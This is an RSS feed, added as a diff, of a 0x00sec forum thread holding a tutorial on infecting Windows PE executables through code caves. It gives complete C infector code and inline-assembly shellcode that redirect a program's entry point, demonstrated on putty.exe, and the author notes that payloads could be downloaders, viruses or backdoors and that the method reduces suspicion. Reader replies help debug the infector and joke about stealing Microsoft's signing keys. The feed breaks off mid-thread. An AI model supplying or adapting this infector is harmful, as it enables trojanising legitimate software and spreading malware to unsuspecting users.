@@ -1,0 +1,697 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>PE File Infection</title>
+    <link>https://0x00sec.org/t/pe-file-infection/401</link>
+    <description>The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the following material may not be suited for beginners as it requires:
+```makefile
+Proficiency in C/C++
+Proficiency in Intel x86 assembly
+Knowledge of the WinAPI and its documentation
+Knowledge of the PE file structure
+Knowledge of Dynamic Linked Libraries
+```
+**Disclaimer**: This paper is written within the scope of my own self research and study of malware and Windows internals and I apologize in advance for any incorrect information. If there is any feedback, please leave a reply or private message me.
+- - - -
+## Infection Technique
+
+The method with which we will be covering consists of taking advantage of the implementation of the PE file structure. _Code caves_ are essentially blocks of empty spaces (or null bytes) which are a result of file alignment of the corresponding section&#39;s data. Because these _holes_ exist, it is entirely possible to place our own data inside with little or nothing preventing us. Here is and example of a code cave in our target application (putty.exe).
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/a7218ea8ee30f36fa774c82d6d8d33bdc99cad2e.PNG&quot; width=&quot;599&quot; height=&quot;429&quot;&gt;
+
+For more information on code caves, please see [CodeProject - The Beginner&#39;s Guide to Codecaves](http://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves).
+
+For our approach, we will be targeting the _last section_ of the executable, injecting our own code inside for execution before jumping back to the original code. Here is a visual representation:
+```makefile
+                Target program&#39;s structure
+                     after infection
+
+                    +----------------+
+                    |     Header     |
+    Original -----&gt; +----------------+ &lt;---+  Return to 
+    start           |     .text      |     |  original start
+                    +----------------+     |  after shellcode
+                    |     .rdata     |     |  finishes execution
+                    +----------------+     |
+                    |       ...      |     |
+                    +----------------+     |
+                    |      .tls      |     |
+    New start ----&gt; +-   -   -   -   + ----+
+                    |    shellcode   |
+                    +----------------+
+                         ^   ^   ^
+                Injected shellcode goes here
+                  inside the .tls section
+```
+As a result of this infection method, the program will remain intact and since we will be injecting the shellcode inside an existing empty region of the file, the file size will not change and will hence reduce suspicion which is essential for malware survival.
+- - - -
+## Coding the Infector
+
+The infector will be responsible for modifying a target application by injecting the shellcode into the last section. Here is the pseudocode:
+
+### Infector Pseudocode
+
+```makefile
+1. Open file to read and write
+2. Extract PE file information
+3. Find a suitably-sized code cave
+4. Tailor shellcode to the target application
+5. Acquire any additional data for the shellcode to function
+6. Inject the shellcode into the application
+7. Modify the application&#39;s original entry point to the start of the shellcode
+```
+
+Let&#39;s now see how we could implement this in code.
+
+**Note**: For the sake of cleanliness and readability, I will not be including error checks.
+
+```c
+int main(int argc, char *argv[]) {
+    if (argc &lt; 2) {
+        fprintf(stderr, &quot;Usage: %s &lt;TARGET FILE&gt;\n&quot;, argv[0]);
+        return 1;
+    }
+
+    HANDLE hFile = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 
+                        0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+
+    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
+
+    LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);
+
+}
+```
+We&#39;ll be designing our program to take in a target file from the command line.
+
+First of all, we need to get a handle to a file using the `CreateFile` function with the read and write access permissions so that we are able to read data from and write data to the file. We&#39;ll also need to get the size of the file for the following task. 
+
+The `CreateFileMapping` function creates a handle to the mapping. We specify a read and write permission (same as `CreateFile`) and also the maximum size we want the mapping to be, i.e. the size of the file.After obtaining the handle to the file mapping, we can create the mapping itself. The `MapViewOfFile` function maps the file into our memory space and returns a pointer to the start of the mapped file, i.e. the beginning of the file. Here we cast the return value as a pointer to an byte which is the same as an unsigned char value.
+
+In this next section, we require that the target file be a legitimate PE file so we need to verify the `MZ` and the `PE\0\0` signatures. I&#39;ve done this with a separate function in a different file which I will show at the end of the article. 
+
+```c
+int main(int argc, char *argv[]) {
+    ...
+
+    // check if valid pe file
+    if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
+        VerifyPE(GetPeHeader(lpFile)) == FALSE) {
+        fprintf(stderr, &quot;Not a valid PE file\n&quot;);
+        return 1;
+    }
+
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
+    PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);
+
+    // get original entry point
+    DWORD dwOEP = pinh-&gt;OptionalHeader.AddressOfEntryPoint + 
+                    pinh-&gt;OptionalHeader.ImageBase;
+
+    DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
+
+}
+```
+Once we&#39;ve verified and the target file is suitable for infection, we need to obtain the original entry point (OEP) so that we can jump back to it after our shellcode finished execution. Here, we also calculate the size of the shellcode by subtracting the end of the shellcode from the beginning. I will show what these functions look like later on and it will make much more sense.
+
+Next, we&#39;ll need to find an appropriate-sized code cave.
+```c
+int main(int argc, char *argv[]) {
+    ...
+
+    // find code cave
+    DWORD dwCount = 0;
+    DWORD dwPosition = 0;
+
+    for (dwPosition = pish-&gt;PointerToRawData; dwPosition &lt; dwFileSize; dwPosition++) {
+        if (*(lpFile + dwPosition) == 0x00) {
+            if (dwCount++ == dwShellcodeSize) {
+                // backtrack to the beginning of the code cave
+                dwPosition -= dwShellcodeSize;
+                break;
+            }
+        } else {
+            // reset counter if failed to find large enough cave
+            dwCount = 0;
+        }
+    }
+
+    // if failed to find suitable code cave
+    if (dwCount == 0 || dwPosition == 0) {
+        return 1;
+    }
+
+}
+```
+We obtained `pish` from the previous code section which is a pointer to the last section&#39;s header. Using the header information, we can calculate the starting position `dwPosition` which points to the beginning of the code in that section and we&#39;ll read to the end of the file using the size of the file `dwFileSize` as a stopping condition.
+
+What we do is we create a loop from the beginning of the section to the end of the section (end of the file) and every time we come across a null byte, we will increment the `dwCount` variable, otherwise, we&#39;ll reset the value if there is a byte which is not a null byte. If the `dwCount` reaches the size of the shellcode, we will have found a code cave which can house it. We&#39;ll then need to subtract the `dwPosition` with the size of the shellcode since we need the offset position of the beginning of the code cave so we know where to write to it later.If, for some reason, we are unable to find a code cave, the `dwCount` should be of size `0` and if the loop fails to start, `dwPosition` will also be `0`. I&#39;m not really sure if these conditions are necessary so but I have them there just in case.
+
+In this example, the target application will spawn a message box before it runs itself normally.
+```c
+int main(int argc, char *argv[]) {
+    ...
+
+    // dynamically obtain address of function
+    HMODULE hModule = LoadLibrary(&quot;user32.dll&quot;);
+
+    LPVOID lpAddress = GetProcAddress(hModule, &quot;MessageBoxA&quot;);
+
+    // create buffer for shellcode
+    HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
+
+    LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
+
+    // move shellcode to buffer to modify
+    memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);
+
+}
+```
+Because of this, we will need the address of the function `MessageBoxA` which is found in the `User32` DLL. First, we&#39;ll need a handle to the `User32` DLL which is done by using the `LoadLibrary` function. We&#39;ll then use the handle with `GetProcAddress` to retrieve the address of the function. Once we have this, we can copy the address into the shellcode so it can call the `MessageBoxA` function. 
+
+Next, we&#39;ll need to dynamically allocate a buffer to store the shellcode itself so that we can modify the placeholder values in the shellcode function with the correct ones, i.e. the OEP and the `MessageBoxA` address.
+```c
+int main(int argc, char *argv[]) {
+    ...
+
+    // modify function address offset
+    DWORD dwIncrementor = 0;
+    for (; dwIncrementor &lt; dwShellcodeSize; dwIncrementor++) {
+        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
+            // insert function&#39;s address
+            *((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
+            FreeLibrary(hModule);
+            break;
+        }
+    }
+
+    // modify OEP address offset
+    for (; dwIncrementor &lt; dwShellcodeSize; dwIncrementor++) {
+        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
+            // insert OEP
+            *((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
+            break;
+        }
+    }
+
+}
+```
+In these two for loops, we attempt to locate the placeholders (`0xAAAAAAAA`) in the shellcode and replace them with the values we need. What they do is they&#39;ll go through the shellcode buffer and if it finds a placeholder, it will overwrite it. These loops cannot be swapped and must maintain this order and we will see why when we have a look at the shellcode function later.
+
+```c
+int main(int argc, char *argv[]) {
+    ...
+
+    // copy the shellcode into code cave
+    memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
+    HeapFree(hHeap, 0, lpHeap);
+    HeapDestroy(hHeap);
+
+    // update PE file information
+    pish-&gt;Misc.VirtualSize += dwShellcodeSize;
+    // make section executable
+    pish-&gt;Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
+    // set entry point
+    // RVA = file offset + virtual offset - raw offset
+    pinh-&gt;OptionalHeader.AddressOfEntryPoint = dwPosition + pish-&gt;VirtualAddress - pish-&gt;PointerToRawData;
+
+    return 0;
+}
+```
+Now that the shellcode is complete, we can inject it into the mapped file using a `memcpy`. Remember that we saved the offset of the code cave with `dwPosition`; we use it here to calculate it from the beginning of the file which is where `lpFile` points to. We simply copy the shellcode buffer with the size of the shellcode. 
+
+We need to update some of the values inside the headers. The section header&#39;s `VirtualSize` member needs to be changed to include the size of the shellcode. We also want the section to be executable so that the shellcode can do its thing. Finally, the `AddressOfEntryPoint` needs to be pointed to the start of the code cave where the shellcode is hiding.
+
+Now, let&#39;s take a look at the shellcode functions.
+```c
+#define db(x) __asm _emit x
+
+__declspec(naked) ShellcodeStart(VOID) {
+    __asm {
+            pushad
+            call    routine
+
+        routine:
+            pop     ebp
+            sub     ebp, offset routine
+            push    0                                // MB_OK
+            lea     eax, [ebp + szCaption]
+            push    eax                              // lpCaption
+            lea     eax, [ebp + szText]
+            push    eax                              // lpText
+            push    0                                // hWnd
+            mov     eax, 0xAAAAAAAA
+            call    eax                              // MessageBoxA
+
+            popad
+            push    0xAAAAAAAA                       // OEP
+            ret
+
+        szCaption:
+            db(&#39;d&#39;) db(&#39;T&#39;) db(&#39;m&#39;) db(&#39; &#39;) db(&#39;W&#39;) db(&#39;u&#39;) db(&#39;Z&#39;) db(&#39; &#39;)
+            db(&#39;h&#39;) db(&#39;3&#39;) db(&#39;r&#39;) db(&#39;e&#39;) db(0)
+        szText :
+            db(&#39;H&#39;) db(&#39;a&#39;) db(&#39;X&#39;) db(&#39;X&#39;) db(&#39;0&#39;) db(&#39;r&#39;) db(&#39;3&#39;) db(&#39;d&#39;)
+            db(&#39; &#39;) db(&#39;b&#39;) db(&#39;y&#39;) db(&#39; &#39;) db(&#39;d&#39;) db(&#39;T&#39;) db(&#39;m&#39;) db(0)
+    }
+}
+
+VOID ShellcodeEnd() {
+
+}
+```
+There are two functions here: `ShellcodeStart` and `ShellcodeEnd`. From before, we calculated the size of the shellcode by subtracting the `ShellcodeStart`&#39;s function address from the `ShellcodeEnd`&#39;s function address. The `ShellcodeEnd` function&#39;s only purpose is to signify the end of the shellcode.
+
+The declaration of the `ShellcodeStart` function uses `__declspec(naked)` since we do not want any prologues or epilogues in our function. We want it as clean as possible.
+
+The shellcode starts with a `pushad` which is an instruction to push all of the registers onto the stack and we need to do this to preserve the process&#39;s context that&#39;s set up for the program to run. Once that&#39;s been handled, we can then execute our routine.
+
+Since this shellcode will be in the memory of another program, we cannot control where the address of values will be and so we will need to use some tricks to dynamically calculate the addresses.
+What we do here is use a technique called a delta offset. What happens is that when routine is called, it immediately pops the return address (which is the address of routine) into the base pointer register. We then subtract the base pointer register&#39;s value with the address of routine and that ultimately results in `0`. We can then calculate the address of the string variables `szCaption` and `szText` by simply adding their addresses onto the base pointer register and in this case, it&#39;s simply their addresses. We then push the parameters of `MessageBoxA` onto the stack and then call the function.
+
+After the routine has finished and done what we wanted, we then recover the register values with `popad`, push the address of OEP and return, effectively jumping back to the original entry point so the program can run normally.
+
+This is what the resulting infected application should look like.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/5801038fd5d9d08fb64e5ab5be0d9f8e884d0bda.PNG&quot; width=&quot;596&quot; height=&quot;431&quot;&gt;
+- - - -
+## A Quick Demonstration
+
+Here is what happens when the infected putty.exe is launched.
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/b93fd76b2b80e431769e7096ebecb766a3e37002.PNG&quot; width=&quot;598&quot; height=&quot;316&quot;&gt;
+
+And then...
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/4343ce1b261cd51dbd4161ff4d697945b8066a89.PNG&quot; width=&quot;690&quot; height=&quot;472&quot;&gt;
+- - - -
+## Conclusion
+The message box dialog is only an example. The potential of the payload is far greater than what has been documented here ranging from downloaders to viruses to backdoors where the only limit (for this specific technique) is the number of available code caves. This example only utilizes one of the many existing ones where more complex implementations can weave and integrate entire applications throughout code caves throughout all sections.
+
+This article has been made possible thanks to [rohitab.com - Detailed Guide to Pe Infection](http://www.rohitab.com/discuss/topic/33006-detailed-guide-to-pe-infection/) with which I used to research and reference. It&#39;s not entirely the same, I made some changes here and there depending on my needs.
+
+Thanks for reading.
+
+_-- dtm_
+- - - -
+## Appendix
+```c
+PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
+    return (PIMAGE_DOS_HEADER)file;
+}
+
+/*
+* returns the PE header
+*/
+PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
+    PIMAGE_DOS_HEADER pidh = GetDosHeader(file);
+
+    return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh-&gt;e_lfanew);
+}
+
+/*
+* returns the file header
+*/
+PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
+
+    return (PIMAGE_FILE_HEADER)&amp;pinh-&gt;FileHeader;
+}
+
+/*
+* returns the optional header
+*/
+PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
+
+    return (PIMAGE_OPTIONAL_HEADER)&amp;pinh-&gt;OptionalHeader;
+}
+
+/*
+* returns the first section&#39;s header
+* AKA .text or the code section
+*/
+PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
+
+    return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
+}
+
+PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
+    return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)-&gt;FileHeader.NumberOfSections - 1));
+}
+
+BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
+    return pidh-&gt;e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
+}
+
+BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
+    return pinh-&gt;Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
+}
+```</description>
+    
+    <lastBuildDate>Wed, 29 Nov 2017 17:50:19 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/pe-file-infection/401.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/36">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/36</link>
+        <pubDate>Sun, 21 Jan 2018 00:42:09 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-36</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[bondbenz]]></dc:creator>
+        <description><![CDATA[
+            <p>finally something tasty to use , great article!</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/35">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/35</link>
+        <pubDate>Wed, 29 Nov 2017 17:50:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-35</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Malware_Info]]></dc:creator>
+        <description><![CDATA[
+            <p>It worked! Thanks buddy <img src="https://0x00sec.org/images/emoji/twitter/thumbsup.png?v=9" title=":thumbsup:" class="emoji" alt=":thumbsup:"></p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/34">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/34</link>
+        <pubDate>Wed, 29 Nov 2017 06:23:30 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-34</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Try replacing the heap with a buffer variable large enough to hold the shellcode.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/33">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/33</link>
+        <pubDate>Wed, 29 Nov 2017 05:39:17 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-33</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Malware_Info]]></dc:creator>
+        <description><![CDATA[
+            <p>Everything is ok…but still no output</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/32">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/32</link>
+        <pubDate>Wed, 29 Nov 2017 03:41:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-32</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Can you check if <code>HeapAlloc</code> was successful and <code>lpHeap</code> contains a valid address?</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/31">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/31</link>
+        <pubDate>Wed, 29 Nov 2017 03:18:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-31</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Malware_Info]]></dc:creator>
+        <description><![CDATA[
+            <p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a928db28a5b9aebde7eb8f0a2100eb1526e2c81e.png" width="690" height="303"></p>
+<p>Shellcode contents are not copied into heap.<br>
+Memory 1  - Shellcode<br>
+Memory 2  - Heap<br>
+So loop fails to find 0xAAAAAAAA and program fails!<br>
+Any help would be appreciated</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/30">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/30</link>
+        <pubDate>Wed, 29 Nov 2017 02:23:36 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-30</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[g3troot]]></dc:creator>
+        <description><![CDATA[
+            <p>This does require a <strong>File2VA()</strong> function as we are mapping the file.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/29">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/29</link>
+        <pubDate>Fri, 11 Aug 2017 17:12:10 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-29</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Try debugging the loop and check to see if there are any alignment issues, e.g. it gives you values like <code>0xAAAAAA</code> or <code>0xAA</code> If there are, you can simply add <code>nop</code>s to the realign the assembly.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/28">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/28</link>
+        <pubDate>Sat, 15 Apr 2017 00:07:59 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-28</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[yingtaomj]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi, I’m running your code on a 64-bit windows system, but using VS x86 debug mode and the exe file is 32-bit too. The problem occurs on <code>*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA</code> , it couldn’t fine a suitable dwIncrementor that meets the requirement. What should I do? Does the code must be running on a 32-bit windows? THANK YOU SO MUCH if you can answer me !</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/27">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/27</link>
+        <pubDate>Fri, 14 Apr 2017 09:07:25 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-27</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>The delta offset method is required for situations where you cannot determine where your values will exist in the virtual memory space of the process (or host) since there are some dynamic elements such as the innate differences of files, base relocations, etc.</p>
+<p>Is that what you were looking for or were you looking for something else? Perhaps this link might provide some insight: <a href="https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/">https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/</a></p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/26">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/26</link>
+        <pubDate>Mon, 20 Feb 2017 11:22:00 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-26</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[mauro3]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi <a class="mention" href="https://0x00sec.org/u/duke_nukem">@Duke_Nukem</a>,</p>
+<ol>
+<li>In this context, you can consider the placeholder as a “fake” virtual address that will later be replaced by the real one. That’s because you don’t know where the <strong>MessageBoxA</strong> function will be located in the virtual address space of the target process. The same applies for the entrypoint: you need to get the OEP at first, and then patch the shellcode.</li>
+<li>Yes, they are the same. It doesn’t matter, since they will get replaced at runtime.</li>
+<li>The shellcode is executed after being patched. This means that the first call will actually call <strong>MessageBoxA</strong>, while the return will actually return to the OEP.</li>
+</ol>
+<p>Hope this helps you to better understand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/25">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/25</link>
+        <pubDate>Sat, 18 Feb 2017 18:24:28 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-25</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[mauro3]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi,</p>
+<p>Could you elaborate a bit more on the “delta offset” technique? I think it’s not that immediate why it’s needed. If I understand correctly, the reason is that the shellcode won’t be loaded at its <em>preferred</em> virtual address most of the times, so we need a way to compute the difference between that address and the real one.</p>
+<p>From your description, it seems the result of <code>sub ebp, offset routine</code> is always 0, which doesn’t make sense (in that case we wouldn’t need any trick and a simple <code>xor ebp, ebp</code> would be enough). So, from what I understand, the result of that subtraction <em>won’t likely be</em> 0 and that’s why we need the delta offset technique. What do you think?</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/24">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/24</link>
+        <pubDate>Sat, 18 Feb 2017 00:38:44 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-24</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Duke_Nukem]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice tutorial thanks !</p>
+<p>Could you give me an explanation about the part where you try to search in the shellcode the placeholder 0xAAAAAAAA ?</p>
+<p>To be more specific:</p>
+<ol>
+<li>What do you mean about “placeholder”?</li>
+<li>The placeholder 0xAAAAAAAA seems to be the same for the lpAddress and the dwOEP…why?</li>
+<li>Furthermore, in the ShellcodeStart function, a first call is made with 0xAAAAAAAA into eax and a return is made with the same value pushed on the stack…can you explain that part more precisely/easily?</li>
+</ol>
+<p>Thanks for you work <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/23">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/23</link>
+        <pubDate>Fri, 17 Feb 2017 13:19:04 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-23</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Yeah, you’re right. Guess I wasn’t paying attention while coding. I’d fix it it the thread but it doesn’t give me the edit option so, can’t really do anything about it.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/22">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/22</link>
+        <pubDate>Mon, 13 Feb 2017 04:57:37 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-22</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[VVid0w]]></dc:creator>
+        <description><![CDATA[
+            <p>Great post! It really opens up a whole new window of opportunity! I’m stoked to see what you may have in store for us next.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/21">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/21</link>
+        <pubDate>Mon, 13 Feb 2017 04:39:59 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-21</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[tsukuyomi]]></dc:creator>
+        <description><![CDATA[
+            <p>Shouldn’t you use OPEN_EXISTING instead of OPEN_ALWAYS when calling CreateFile?</p>
+<p>If the file doesn’t exist, OPEN_EXISTING will return an error code. OPEN_ALWAYS will create a new file if it doesn’t already exist, you then call GetFileSize and retrieve the size of the empty file and attempt to map the empty file into memory.</p>
+<p>MSDN (CreateFileMapping function’s fourth parameter):</p>
+<pre><code>The low-order DWORD of the maximum size of the file mapping object.
+
+If this parameter and dwMaximumSizeHigh are 0 (zero), the maximum size of the file mapping object is equal to the current size of the file that hFile identifies.
+
+An attempt to map a file with a length of 0 (zero) fails with an error code of ERROR_FILE_INVALID. Applications should test for files with a length of 0 (zero) and reject those files.
+</code></pre>
+<p>^ “Applications should test for files with a length of 0 (zero) and reject those files.”</p>
+<p>CreateFileMapping &amp; MapViewOfFile will both fail if CreateFile creates a new file. CreateFileMapping fails because the file size of the newly created file is zero and MapViewOfFile fails because CreateFileMapping returns NULL to its handle after failing. CreateFileMapping  returns ERROR_FILE_INVALID(1006) and MapViewOfFile returns ERROR_INVALID_HANDLE(6).  Change CreateFile’s dwCreationDisposition parameter to OPEN_EXISTING.</p>
+          <p><a href="https://0x00sec.org/t/pe-file-infection/401/20">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pe-file-infection/401/20</link>
+        <pubDate>Mon, 13 Feb 2017 00:01:30 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-401-20</guid>
+        <source url="https://0x00sec.org/t/pe-file-infection/401.rss">PE File Infection</source>
+      </item>
+      <item>
+        <title>PE File Infection</title>
+        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
+        <description><![CDATA[
+            <p>Avoiding the untrusted publisher pop-up would be simple, we just need to steal Microsoft’s private keys which they use to sign programs.</p>
